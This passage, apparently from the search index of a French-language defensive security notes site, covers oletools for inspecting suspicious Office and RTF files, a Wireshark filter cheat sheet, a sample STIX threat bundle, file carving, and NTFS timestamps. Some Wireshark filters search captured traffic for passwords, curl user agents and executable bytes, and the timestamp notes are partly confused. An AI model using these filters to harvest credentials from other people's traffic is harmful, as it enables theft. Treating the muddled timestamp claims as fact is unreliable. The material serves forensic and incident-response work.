</ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#6-oletimes-analyse-des-timestamps-des-flux","title":"6. <code>oletimes</code> - Analyse des Timestamps des Flux","text":"<ul> <li>Description : Affiche les timestamps de cr\u00e9ation et de modification de chaque flux (stream) et stockage (storage) \u00e0 l'int\u00e9rieur du fichier OLE.</li> <li>Usage : <code>oletimes &lt;fichier&gt;</code></li> <li>Exemple : <pre><code>oletimes document_suspect.docm\n</code></pre></li> <li>Interpr\u00e9tation : Des timestamps anormaux (ex: tous identiques \u00e0 la seconde pr\u00e8s, dates futures/pass\u00e9es lointaines) ou tr\u00e8s rapproch\u00e9s pour de nombreux flux peuvent indiquer une g\u00e9n\u00e9ration automatique par un outil malveillant ou une manipulation du fichier.</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#7-oleobj-extraction-dobjets-ole-embarques","title":"7. <code>oleobj</code> - Extraction d'Objets OLE Embarqu\u00e9s","text":"<ul> <li>Description : D\u00e9tecte et extrait les objets OLE embarqu\u00e9s (fichiers, scripts, objets Package) \u00e0 l'int\u00e9rieur des fichiers OLE. Plus sp\u00e9cialis\u00e9 que <code>oledump -e</code>.</li> <li>Usage : <code>oleobj [options] &lt;fichier&gt;</code></li> <li>Options Utiles :<ul> <li><code>-i</code> : Mode interactif pour choisir les objets \u00e0 extraire.</li> <li><code>-d &lt;r\u00e9pertoire&gt;</code> : Sp\u00e9cifie le r\u00e9pertoire o\u00f9 sauvegarder les objets extraits.</li> <li><code>-x</code> : Extrait les objets sans demander de confirmation.</li> </ul> </li> <li>Exemple : <pre><code># Extraire tous les objets dans le dossier ./extracted_objects\noleobj -d ./extracted_objects document_avec_objet.doc\n</code></pre></li> <li>Interpr\u00e9tation : Les objets extraits doivent ensuite \u00eatre analys\u00e9s s\u00e9par\u00e9ment (ex: un <code>.exe</code> extrait doit \u00eatre analys\u00e9 comme un malware potentiel).</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#8-rtfobj-analyse-des-fichiers-rtf","title":"8. <code>rtfobj</code> - Analyse des Fichiers RTF","text":"<ul> <li>Description : Sp\u00e9cialement con\u00e7u pour analyser les fichiers RTF (Rich Text Format). D\u00e9tecte et extrait les objets OLE embarqu\u00e9s, qui sont un vecteur d'attaque courant dans les RTF (ex: exploitation de vuln\u00e9rabilit\u00e9s comme CVE-2017-11882 - Equation Editor).</li> <li>Usage : <code>rtfobj [options] &lt;fichier.rtf&gt;</code></li> <li>Options Utiles :<ul> <li><code>-s &lt;index&gt;</code> : Sauvegarde l'objet sp\u00e9cifi\u00e9 par son index dans un fichier.</li> <li><code>-S</code> : Sauvegarde tous les objets d\u00e9tect\u00e9s dans des fichiers s\u00e9par\u00e9s.</li> <li><code>-d &lt;r\u00e9pertoire&gt;</code> : R\u00e9pertoire de sauvegarde pour les objets extraits.</li> </ul> </li> <li>Exemple : <pre><code># Sauvegarder tous les objets trouv\u00e9s dans le dossier ./rtf_extracted\nrtfobj -S -d ./rtf_extracted document_rtf_suspect.rtf\n</code></pre></li> <li>Interpr\u00e9tation : Les objets extraits (souvent des OLE contenant des exploits ou d'autres charges utiles) n\u00e9cessitent une analyse plus approfondie.</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#9-olemap-visualisation-de-la-structure-ole","title":"9. <code>olemap</code> - Visualisation de la Structure OLE","text":"<ul> <li>Description : Affiche une carte textuelle des secteurs du fichier OLE, indiquant quels secteurs sont utilis\u00e9s par quels flux ou structures internes (FAT, Directory, etc.).</li> <li>Usage : <code>olemap &lt;fichier&gt;</code></li> <li>Exemple : <pre><code>olemap document_complexe.ppt\n</code></pre></li> <li>Interpr\u00e9tation : Principalement utile pour les analyses tr\u00e8s pouss\u00e9es afin de comprendre comment le fichier est organis\u00e9 physiquement et d\u00e9tecter d'\u00e9ventuelles anomalies de structure ou des donn\u00e9es cach\u00e9es dans des secteurs non r\u00e9f\u00e9renc\u00e9s.</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#10-olebrowse-explorateur-ole-interactif","title":"10. <code>olebrowse</code> - Explorateur OLE Interactif","text":"<ul> <li>Description : Fournit une interface simple en ligne de commande (similaire \u00e0 un shell) pour naviguer dans la structure hi\u00e9rarchique (stockages et flux) d'un fichier OLE.</li> <li>Usage : <code>olebrowse &lt;fichier&gt;</code></li> <li>Exemple : <pre><code>olebrowse document.doc\n# Commandes interactives: ls (lister), cd &lt;stockage&gt;, stream &lt;flux&gt; (afficher), exit\n</code></pre></li> <li>Interpr\u00e9tation : Permet une exploration manuelle et cibl\u00e9e de la structure OLE sans extraire tous les flux.</li> </ul>"},{"location":"Blue%20Team/Analyse/doc/OleTools/#11-pyxswf-analyse-des-fichiers-flash-swf","title":"11. <code>pyxswf</code> - Analyse des Fichiers Flash (SWF)","text":"<ul> <li>Description : D\u00e9tecte, extrait et tente de d\u00e9compresser/d\u00e9compiler (en utilisant <code>swfdecompress</code> si disponible) les objets Flash (SWF) potentiellement embarqu\u00e9s dans des documents Office.</li> <li>Usage : <code>pyxswf &lt;fichier&gt;</code></li> <li>Exemple : <pre><code>pyxswf presentation_flash.ppt\n</code></pre></li> <li>Interpr\u00e9tation : Les fichiers Flash \u00e9taient autrefois un vecteur d'attaque courant. Cet outil permet d'isoler le SWF pour une analyse ult\u00e9rieure (recherche de code ActionScript malveillant, exploitation de vuln\u00e9rabilit\u00e9s Flash Player).</li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/DNS%20tunneling/","title":"DNS tunneling","text":"<p>Dans le cas o\u00f9 un attaquant a utilis\u00e9 un outil de tunnel DNS pour cacher ses activit\u00e9s, le traffic peut \u00eatre d\u00e9cod\u00e9 avec l'outil dnscat-decoder :</p> <p>https://github.com/micksmix/DNSCatDecoder</p> <p></p> <p></p>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/","title":"Wireshark","text":"<p>Objectif : Wireshark est l'analyseur de protocoles r\u00e9seau le plus utilis\u00e9 au monde. Il permet de capturer le trafic r\u00e9seau en temps r\u00e9el ou d'analyser des fichiers de capture (<code>.pcap</code>, <code>.pcapng</code>), de d\u00e9cortiquer les protocoles couche par couche, et d'appliquer des filtres puissants pour isoler et comprendre les communications.</p> <p>Source : https://www.wireshark.org/</p>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#demarrage-et-capture","title":"\ud83d\ude80 D\u00e9marrage et Capture","text":""},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#lancer-wireshark","title":"Lancer Wireshark","text":"<ul> <li>G\u00e9n\u00e9ralement lanc\u00e9 depuis le menu de votre OS ou via la commande <code>wireshark</code> (peut n\u00e9cessiter <code>sudo</code> sous Linux pour acc\u00e9der aux interfaces r\u00e9seau).</li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#selectionner-une-interface-et-demarrer-la-capture","title":"S\u00e9lectionner une Interface et D\u00e9marrer la Capture","text":"<ul> <li> <p>Au d\u00e9marrage, Wireshark liste les interfaces r\u00e9seau disponibles.</p> </li> <li> <p>Double-cliquez sur l'interface souhait\u00e9e (ex: <code>eth0</code>, <code>Wi-Fi</code>) pour d\u00e9marrer la capture imm\u00e9diatement.</p> </li> <li> <p>Alternativement, s\u00e9lectionnez l'interface et cliquez sur l'ic\u00f4ne en forme d'aileron de requin bleu (ou <code>Capture -&gt; Start</code>).</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#options-de-capture-avant-de-demarrer","title":"Options de Capture (Avant de d\u00e9marrer)","text":"<ul> <li> <p>Acc\u00e8s via <code>Capture -&gt; Options...</code> (ou l'ic\u00f4ne d'engrenage \u00e0 c\u00f4t\u00e9 des interfaces).</p> </li> <li> <p>Filtres de Capture (BPF Syntax): Permettent de ne capturer que le trafic correspondant au filtre. Utile pour limiter la taille des captures sur des r\u00e9seaux tr\u00e8s charg\u00e9s.</p> </li> <li> <p><code>host 192.168.1.10</code> : Trafic vers ou depuis cette IP.</p> </li> <li> <p><code>net 192.168.1.0/24</code> : Trafic vers ou depuis ce sous-r\u00e9seau.</p> </li> <li> <p><code>port 80</code> : Trafic sur le port 80 (source ou destination).</p> </li> <li> <p><code>tcp port 443</code> : Trafic TCP sur le port 443.</p> </li> <li> <p><code>udp port 53</code> : Trafic UDP sur le port 53.</p> </li> <li> <p><code>src host 10.0.0.5</code> : Trafic provenant de cette IP.</p> </li> <li> <p><code>dst port 22</code> : Trafic destin\u00e9 au port 22.</p> </li> <li> <p><code>icmp</code> : Trafic ICMP uniquement.</p> </li> <li> <p>Combinaisons : <code>host 192.168.1.10 and port 80</code>, <code>not port 22</code>, <code>port 80 or port 443</code>.</p> </li> <li> <p>Fichiers de sortie : Configurer la sauvegarde automatique dans un ou plusieurs fichiers, avec des limites de taille ou de temps.</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#arreter-la-capture","title":"Arr\u00eater la Capture","text":"<ul> <li>Cliquez sur l'ic\u00f4ne carr\u00e9e rouge d'arr\u00eat (ou <code>Capture -&gt; Stop</code>).</li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#interface-principale","title":"\ud83c\udfa8 Interface Principale","text":"<p>Wireshark pr\u00e9sente g\u00e9n\u00e9ralement 3 panneaux principaux :</p> <ol> <li> <p>Liste des Paquets (Packet List) : Chaque ligne repr\u00e9sente un paquet captur\u00e9 (Num\u00e9ro, Temps, Source IP, Destination IP, Protocole, Infos). Les couleurs indiquent souvent le type de trafic (configurable).</p> </li> <li> <p>D\u00e9tails du Paquet (Packet Details) : Arborescence montrant les diff\u00e9rentes couches (Frame, Ethernet, IP, TCP/UDP, Application) du paquet s\u00e9lectionn\u00e9 dans la liste. Permet d'inspecter les en-t\u00eates et les donn\u00e9es de chaque couche.</p> </li> <li> <p>Octets du Paquet (Packet Bytes) : Repr\u00e9sentation hexad\u00e9cimale et ASCII du contenu brut du paquet s\u00e9lectionn\u00e9.</p> </li> </ol>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#filtres-daffichage-display-filters","title":"\ud83d\udd0d Filtres d'Affichage (Display Filters)","text":"<ul> <li> <p>Objectif : Masquer les paquets non pertinents apr\u00e8s la capture pour se concentrer sur des communications sp\u00e9cifiques. La syntaxe est diff\u00e9rente des filtres de capture.</p> </li> <li> <p>Zone de Saisie : Barre verte/rouge en haut de la fen\u00eatre principale.</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#syntaxe-de-base","title":"Syntaxe de Base","text":"<ul> <li> <p><code>protocole</code> : Affiche uniquement les paquets de ce protocole (ex: <code>tcp</code>, <code>udp</code>, <code>http</code>, <code>dns</code>, <code>smb</code>, <code>arp</code>, <code>icmp</code>).</p> </li> <li> <p><code>champ [op\u00e9rateur] valeur</code> : Filtre bas\u00e9 sur la valeur d'un champ sp\u00e9cifique d'un protocole.</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#operateurs-courants","title":"Op\u00e9rateurs Courants","text":"<ul> <li> <p><code>==</code> ou <code>eq</code> : \u00c9gal \u00e0</p> </li> <li> <p><code>!=</code> ou <code>ne</code> : Diff\u00e9rent de</p> </li> <li> <p><code>&gt;</code> ou <code>gt</code> : Sup\u00e9rieur \u00e0</p> </li> <li> <p><code>&lt;</code> ou <code>lt</code> : Inf\u00e9rieur \u00e0</p> </li> <li> <p><code>&gt;=</code> ou <code>ge</code> : Sup\u00e9rieur ou \u00e9gal \u00e0</p> </li> <li> <p><code>&lt;=</code> ou <code>le</code> : Inf\u00e9rieur ou \u00e9gal \u00e0</p> </li> <li> <p><code>contains</code> : Le champ (ou le paquet entier <code>frame</code>) contient la cha\u00eene de caract\u00e8res ou la s\u00e9quence d'octets.</p> </li> <li> <p><code>matches</code> ou <code>~</code> : Le champ correspond \u00e0 une expression r\u00e9guli\u00e8re (PCRE).</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#operateurs-logiques","title":"Op\u00e9rateurs Logiques","text":"<ul> <li> <p><code>&amp;&amp;</code> ou <code>and</code> : ET logique</p> </li> <li> <p><code>||</code> ou <code>or</code> : OU logique</p> </li> <li> <p><code>!</code> ou <code>not</code> : NON logique</p> </li> <li> <p>Parenth\u00e8ses <code>()</code> pour grouper les expressions.</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#exemples-de-filtres-daffichage-utiles","title":"Exemples de Filtres d'Affichage Utiles","text":"<ul> <li> <p>Par IP :</p> </li> <li> <p><code>ip.addr == 192.168.1.10</code> (Source ou Destination)</p> </li> <li> <p><code>ip.src == 10.0.0.5</code> (Source uniquement)</p> </li> <li> <p><code>ip.dst == 8.8.8.8</code> (Destination uniquement)</p> </li> <li> <p><code>not ip.addr == 192.168.1.1</code> (Exclure une IP)</p> </li> <li> <p>Par Port :</p> </li> <li> <p><code>tcp.port == 443</code> (Port TCP source ou destination)</p> </li> <li> <p><code>udp.port == 53</code> (Port UDP source ou destination)</p> </li> <li> <p><code>tcp.dstport == 80</code> (Port TCP destination uniquement)</p> </li> <li> <p>Par Protocole Applicatif :</p> </li> <li> <p><code>http</code> (Tout le trafic HTTP)</p> </li> <li> <p><code>http.request.method == \"POST\"</code> (Requ\u00eates HTTP POST)</p> </li> <li> <p><code>http.response.code == 404</code> (R\u00e9ponses HTTP 404 Not Found)</p> </li> <li> <p><code>dns</code> (Tout le trafic DNS)</p> </li> <li> <p><code>dns.qry.name == \"www.google.com\"</code> (Requ\u00eates DNS pour ce nom)</p> </li> <li> <p><code>smb2</code> (Trafic SMB version 2/3)</p> </li> <li> <p><code>tls</code> (Trafic TLS/SSL, souvent sur port 443)</p> </li> <li> <p><code>dhcp</code> (Trafic DHCP)</p> </li> <li> <p>Par Flags TCP :</p> </li> <li> <p><code>tcp.flags.syn == 1 and tcp.flags.ack == 0</code> (Paquets SYN purs - d\u00e9but de connexion)</p> </li> <li> <p><code>tcp.flags.reset == 1</code> (Paquets RST - connexion r\u00e9initialis\u00e9e)</p> </li> <li> <p><code>tcp.flags.fin == 1</code> (Paquets FIN - fin de connexion)</p> </li> <li> <p>Par Contenu :</p> </li> <li> <p><code>frame contains \"password\"</code> (Recherche la cha\u00eene \"password\" n'importe o\u00f9 dans le paquet)</p> </li> <li> <p><code>http contains \"USER-AGENT: curl\"</code> (Recherche dans les paquets HTTP)</p> </li> <li> <p><code>tcp.payload contains 4d:5a</code> (Recherche la s\u00e9quence d'octets <code>MZ</code> dans le payload TCP)</p> </li> <li> <p>Combinaisons :</p> </li> <li> <p><code>ip.addr == 192.168.1.50 &amp;&amp; tcp.port == 80</code> (Trafic HTTP vers/depuis 192.168.1.50)</p> </li> <li> <p><code>http || dns</code> (Affiche le trafic HTTP ou DNS)</p> </li> <li> <p><code>ip.addr == 10.0.0.10 and not port 53</code> (Trafic vers/depuis 10.0.0.10, sauf DNS)</p> </li> </ul> <p>[!Astuce]</p> <p>Wireshark propose l'auto-compl\u00e9tion pour les filtres. Commencez \u00e0 taper un protocole (ex: <code>ip.</code>) pour voir les champs disponibles. La barre de filtre devient verte si la syntaxe est valide, rouge sinon. Cliquez sur \"Expression...\" pour un constructeur de filtres graphique.</p>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#analyse-du-trafic","title":"\ud83d\udd2c Analyse du Trafic","text":""},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#suivre-une-conversation-stream","title":"Suivre une Conversation (Stream)","text":"<ul> <li> <p>Objectif : Reconstituer et visualiser l'\u00e9change de donn\u00e9es complet entre deux points pour un protocole sp\u00e9cifique.</p> </li> <li> <p>Comment faire : Clic droit sur un paquet de la conversation -&gt; <code>Follow</code> -&gt; <code>TCP Stream</code> (ou <code>UDP Stream</code>, <code>HTTP Stream</code>, <code>TLS Stream</code>, etc.).</p> </li> <li> <p>Usage : Tr\u00e8s utile pour lire des requ\u00eates/r\u00e9ponses HTTP, voir des \u00e9changes de donn\u00e9es applicatives, ou comprendre le d\u00e9roulement d'une connexion TCP.</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#statistiques","title":"Statistiques","text":"<ul> <li> <p>Acc\u00e8s via le menu <code>Statistics</code>.</p> </li> <li> <p>Conversations : Liste les \u00e9changes entre paires d'adresses (Ethernet, IPv4, IPv6, TCP, UDP). Utile pour voir qui communique le plus avec qui.</p> </li> <li> <p>Endpoints : Similaire \u00e0 Conversations, mais liste toutes les adresses uniques et leurs statistiques de trafic.</p> </li> <li> <p>Protocol Hierarchy : Montre la r\u00e9partition du trafic par protocole. Utile pour avoir une vue d'ensemble rapide de ce qui transite sur le r\u00e9seau.</p> </li> <li> <p>IO Graphs : Permet de visualiser le d\u00e9bit du trafic (total ou filtr\u00e9) au fil du temps. Utile pour rep\u00e9rer des pics d'activit\u00e9 ou des transferts de donn\u00e9es importants.</p> </li> <li> <p>Resolved Addresses : Affiche les correspondances entre adresses IP/MAC et les noms r\u00e9solus (DNS, NetBIOS).</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#exportation-dobjets","title":"Exportation d'Objets","text":"<ul> <li> <p>Objectif : Extraire des fichiers transf\u00e9r\u00e9s via certains protocoles.</p> </li> <li> <p>Comment faire : <code>File -&gt; Export Objects -&gt; HTTP...</code> (ou <code>SMB</code>, <code>DICOM</code>, etc.).</p> </li> <li> <p>Usage : Permet de r\u00e9cup\u00e9rer des images, des ex\u00e9cutables, des documents, etc., t\u00e9l\u00e9charg\u00e9s via HTTP ou transf\u00e9r\u00e9s via SMB.</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#analyse-experte","title":"Analyse Experte","text":"<ul> <li> <p>Objectif : Laisser Wireshark identifier des probl\u00e8mes potentiels ou des anomalies dans la capture.</p> </li> <li> <p>Comment faire : <code>Analyze -&gt; Expert Information</code>.</p> </li> <li> <p>Usage : Peut signaler des retransmissions TCP excessives, des erreurs, des paquets malform\u00e9s, etc. (Notes, Chats, Warnings, Errors).</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#navigation-et-recherche","title":"Navigation et Recherche","text":"<ul> <li> <p><code>Ctrl + F</code> (ou <code>Edit -&gt; Find Packet...</code>) : Rechercher un paquet bas\u00e9 sur un filtre d'affichage, une cha\u00eene hexad\u00e9cimale ou une cha\u00eene de caract\u00e8res.</p> </li> <li> <p><code>Ctrl + G</code> (ou <code>Go -&gt; Go to Packet...</code>) : Aller directement \u00e0 un num\u00e9ro de paquet sp\u00e9cifique.</p> </li> <li> <p><code>Ctrl + Fl\u00e8che Droite</code> / <code>Ctrl + Fl\u00e8che Gauche</code> : Naviguer vers le paquet suivant/pr\u00e9c\u00e9dent dans l'historique de s\u00e9lection.</p> </li> <li> <p><code>Clic droit -&gt; Apply as Filter</code> / <code>Prepare a Filter</code> : Cr\u00e9er rapidement des filtres bas\u00e9s sur les champs du paquet s\u00e9lectionn\u00e9.</p> </li> </ul>"},{"location":"Blue%20Team/Analyse/pcap/CheatSheet/Wireshark/#astuces-utiles","title":"\u2728 Astuces Utiles","text":"<ul> <li> <p>Coloration : Personnalisez les r\u00e8gles de coloration (<code>View -&gt; Coloring Rules...</code>) pour mettre en \u00e9vidence le trafic qui vous int\u00e9resse le plus (ex: paquets RST en rouge vif, trafic DNS en jaune).</p> </li> <li> <p>Profils : Cr\u00e9ez diff\u00e9rents profils (<code>Edit -&gt; Configuration Profiles...</code>) pour sauvegarder des ensembles de configurations (colonnes affich\u00e9es, r\u00e8gles de coloration, filtres pr\u00e9f\u00e9r\u00e9s) adapt\u00e9s \u00e0 diff\u00e9rents types d'analyses.</p> </li> <li> <p>Colonnes : Personnalisez les colonnes affich\u00e9es dans la liste des paquets (<code>Edit -&gt; Preferences -&gt; Appearance -&gt; Columns</code>) pour afficher directement des informations pertinentes (ex: <code>http.host</code>, <code>dns.qry.name</code>).</p> </li> <li> <p>R\u00e9solution de Noms : Activez/d\u00e9sactivez la r\u00e9solution de noms (<code>View -&gt; Name Resolution</code>) pour voir les noms DNS/NetBIOS au lieu des adresses IP (peut ralentir l'affichage).</p> </li> <li> <p>Commentaires : Ajoutez des commentaires aux paquets (<code>Clic droit -&gt; Packet Comment...</code>) pour annoter vos d\u00e9couvertes pendant l'analyse.</p> </li> </ul>"},{"location":"Blue%20Team/CTI/STIX/","title":"STIX","text":"<p>Exemple :</p> <pre><code>{\n  \"type\": \"bundle\",\n  \"id\": \"bundle--3c4f8b42-47f2-4976-bf3a-2bd57e67b63c\",\n  \"spec_version\": \"2.1\",\n  \"objects\": [\n    {\n      \"type\": \"threat-actor\",\n      \"id\": \"threat-actor--8e6a4f12-132b-4c6f-b3a3-621bdc7f94b5\",\n      \"created\": \"2025-03-10T10:00:00.000Z\",\n      \"modified\": \"2025-03-10T10:00:00.000Z\",\n      \"name\": \"APT-42\",\n      \"description\": \"Un groupe APT connu pour des attaques cibl\u00e9es sur des infrastructures critiques.\",\n      \"threat_actor_types\": [\"nation-state\"],\n      \"aliases\": [\"Groupe Fant\u00f4me\"],\n      \"roles\": [\"sponsor\"],\n      \"primary_motivation\": \"espionage\"\n    },\n    {\n      \"type\": \"malware\",\n      \"id\": \"malware--3d3b4a44-d8f3-4c67-8051-9b1f3235f46a\",\n      \"created\": \"2025-03-10T10:00:00.000Z\",\n      \"modified\": \"2025-03-10T10:00:00.000Z\",\n      \"name\": \"ShadowSpy\",\n      \"description\": \"Un malware utilis\u00e9 par APT-42 pour la collecte de donn\u00e9es.\",\n      \"malware_types\": [\"remote-access-trojan\"],\n      \"is_family\": false\n    },\n    {\n      \"type\": \"indicator\",\n      \"id\": \"indicator--d7e4d6f7-52df-4b89-9b71-d54352f42d56\",\n      \"created\": \"2025-03-10T10:00:00.000Z\",\n      \"modified\": \"2025-03-10T10:00:00.000Z\",\n      \"name\": \"IP suspecte de ShadowSpy\",\n      \"description\": \"Cette adresse IP est associ\u00e9e aux activit\u00e9s du malware ShadowSpy.\",\n      \"indicator_types\": [\"malicious-activity\"],\n      \"pattern\": \"[ipv4-addr:value = '203.0.113.45']\",\n      \"pattern_type\": \"stix\",\n      \"valid_from\": \"2025-03-10T10:00:00.000Z\"\n    },\n    {\n      \"type\": \"attack-pattern\",\n      \"id\": \"attack-pattern--6f2d63ab-60cd-4984-8c3c-e40f7df60e2f\",\n      \"created\": \"2025-03-10T10:00:00.000Z\",\n      \"modified\": \"2025-03-10T10:00:00.000Z\",\n      \"name\": \"Phishing via pi\u00e8ce jointe malveillante\",\n      \"description\": \"Utilisation d'un document Word pi\u00e9g\u00e9 pour ex\u00e9cuter un malware.\",\n      \"external_references\": [\n        {\n          \"source_name\": \"MITRE ATT&amp;CK\",\n          \"url\": \"https://attack.mitre.org/techniques/T1566/001/\",\n          \"external_id\": \"T1566.001\"\n        }\n      ]\n    },\n    {\n      \"type\": \"observed-data\",\n      \"id\": \"observed-data--c9b9c9d4-b792-4d1c-bf7a-3e5ff2b172e8\",\n      \"created\": \"2025-03-10T10:00:00.000Z\",\n      \"modified\": \"2025-03-10T10:00:00.000Z\",\n      \"first_observed\": \"2025-03-09T22:15:00.000Z\",\n      \"last_observed\": \"2025-03-09T22:30:00.000Z\",\n      \"number_observed\": 3,\n      \"object_refs\": [\"ipv4-addr--a67dbd13-9c6e-4f76-91f8-3cfb67a7b0b7\"]\n    },\n    {\n      \"type\": \"ipv4-addr\",\n      \"id\": \"ipv4-addr--a67dbd13-9c6e-4f76-91f8-3cfb67a7b0b7\",\n      \"value\": \"203.0.113.45\"\n    },\n    {\n      \"type\": \"relationship\",\n      \"id\": \"relationship--e6b3498c-7c2c-4a8f-b02b-1e0b5f1d5c44\",\n      \"relationship_type\": \"uses\",\n      \"source_ref\": \"threat-actor--8e6a4f12-132b-4c6f-b3a3-621bdc7f94b5\",\n      \"target_ref\": \"malware--3d3b4a44-d8f3-4c67-8051-9b1f3235f46a\",\n      \"description\": \"APT-42 utilise ShadowSpy pour espionner ses cibles.\"\n    },\n    {\n      \"type\": \"relationship\",\n      \"id\": \"relationship--f3a9c1d6-2d4e-48ad-9a5b-3f23f76e2a16\",\n      \"relationship_type\": \"indicates\",\n      \"source_ref\": \"indicator--d7e4d6f7-52df-4b89-9b71-d54352f42d56\",\n      \"target_ref\": \"malware--3d3b4a44-d8f3-4c67-8051-9b1f3235f46a\",\n      \"description\": \"L'indicateur IP est li\u00e9 au malware ShadowSpy.\"\n    },\n    {\n      \"type\": \"relationship\",\n      \"id\": \"relationship--d2e16b59-f798-4c43-9a5d-4b8c516b63ab\",\n      \"relationship_type\": \"uses\",\n      \"source_ref\": \"malware--3d3b4a44-d8f3-4c67-8051-9b1f3235f46a\",\n      \"target_ref\": \"attack-pattern--6f2d63ab-60cd-4984-8c3c-e40f7df60e2f\",\n      \"description\": \"Le malware ShadowSpy est propag\u00e9 via un phishing avec document pi\u00e9g\u00e9.\"\n    }\n  ]\n}\n</code></pre>"},{"location":"Blue%20Team/Forensic/Disque/Dump%20disque/","title":"Dump disque","text":"<p>FTK Image : https://www.exterro.com/ftk-imager</p>"},{"location":"Blue%20Team/Forensic/Disque/Fichiers%20effac%C3%A9s/","title":"Fichiers effac\u00e9s","text":""},{"location":"Blue%20Team/Forensic/Disque/Fichiers%20effac%C3%A9s/#scalpel","title":"Scalpel","text":"<p>Modifier dans /etc/scalpel/scalpel.conf les types de fichiers qui sont \u00e0 chercher.</p> <p>puis:</p> <pre><code>scalpel -o /home/pak/Output Disk.img\n</code></pre>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/","title":"MAC(b) Times (NTFS)","text":"<ul> <li><code>Modified Time (M)</code>: Ce timestamp capture la derni\u00e8re instance o\u00f9 le contenu du fichier a \u00e9t\u00e9 modifi\u00e9. Toute alt\u00e9ration des donn\u00e9es du fichier, telle que des modifications du contenu, d\u00e9clenche une mise \u00e0 jour de ce timestamp.</li> <li><code>Accessed Time (A)</code>: Ce timestamp refl\u00e8te la derni\u00e8re occasion o\u00f9 le fichier a \u00e9t\u00e9 acc\u00e9d\u00e9 ou lu, se mettant \u00e0 jour chaque fois que le fichier est ouvert ou consult\u00e9.</li> <li><code>Changed [Change in MFT Record] (C)</code>: Ce timestamp signifie des changements dans l'enregistrement MFT. Il capture le moment o\u00f9 le fichier a \u00e9t\u00e9 initialement cr\u00e9\u00e9. Cependant, il est important de noter que certains syst\u00e8mes de fichiers, comme NTFS, peuvent mettre \u00e0 jour ce timestamp si le fichier est d\u00e9plac\u00e9 ou copi\u00e9.</li> <li><code>Birth Time (b)</code>: Souvent appel\u00e9 timestamp de naissance ou de cr\u00e9ation, il repr\u00e9sente le moment pr\u00e9cis o\u00f9 le fichier ou l'objet a \u00e9t\u00e9 cr\u00e9\u00e9 sur le syst\u00e8me de fichiers. Son importance dans les investigations forensic ne doit pas \u00eatre sous-estim\u00e9e, notamment pour d\u00e9terminer le moment de cr\u00e9ation initiale d'un fichier.</li> </ul>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/#creation-de-fichier","title":"Cr\u00e9ation de Fichier :","text":"<ul> <li>Modified Timestamp (M) : Le timestamp de modification est mis \u00e0 jour pour refl\u00e9ter l'heure de la cr\u00e9ation du fichier.</li> <li>Accessed Timestamp (A) : Le timestamp d'acc\u00e8s est mis \u00e0 jour pour refl\u00e9ter que le fichier a \u00e9t\u00e9 acc\u00e9d\u00e9 au moment de sa cr\u00e9ation.</li> <li>Birth (Created) Timestamp (b) : Le timestamp de naissance est d\u00e9fini \u00e0 l'heure de cr\u00e9ation du fichier.</li> </ul>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/#modification-de-fichier","title":"Modification de Fichier :","text":"<ul> <li>Modified Timestamp (M) : Le timestamp de modification est mis \u00e0 jour pour refl\u00e9ter l'heure \u00e0 laquelle le contenu ou les attributs du fichier ont \u00e9t\u00e9 modifi\u00e9s pour la derni\u00e8re fois.</li> <li>Accessed Timestamp (A) : Le timestamp d'acc\u00e8s n'est pas mis \u00e0 jour lorsque le fichier est modifi\u00e9.</li> <li>Birth (Created) Timestamp (b) : Le timestamp de naissance n'est pas mis \u00e0 jour lorsque le fichier est modifi\u00e9.</li> </ul>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/#copie-de-fichier","title":"Copie de Fichier :","text":"<ul> <li>Modified Timestamp (M) : Le timestamp de modification n'est g\u00e9n\u00e9ralement pas mis \u00e0 jour lorsqu'un fichier est copi\u00e9. Il h\u00e9rite habituellement du timestamp du fichier source.</li> <li>Accessed Timestamp (A) : Le timestamp d'acc\u00e8s est mis \u00e0 jour pour refl\u00e9ter que le fichier a \u00e9t\u00e9 acc\u00e9d\u00e9 au moment de la copie.</li> <li>Birth (Created) Timestamp (b) : Le timestamp de naissance est mis \u00e0 jour \u00e0 l'heure de la copie, indiquant le moment o\u00f9 la copie a \u00e9t\u00e9 cr\u00e9\u00e9e.</li> </ul>"},{"location":"Blue%20Team/Forensic/Disque/MAC%28b%29%20Times%20%28NTFS%29/#acces-au-fichier","title":"Acc\u00e8s au Fichier :","text":"<ul> <li>Modified Timestamp (M) : Le timestamp de modification n'est pas mis \u00e0 jour lorsque le fichier est acc\u00e9d\u00e9.</li> <li>Accessed Timestamp (A) : Le timestamp d'acc\u00e8s est mis \u00e0 jour pour refl\u00e9ter l'heure de l'acc\u00e8s.</li> 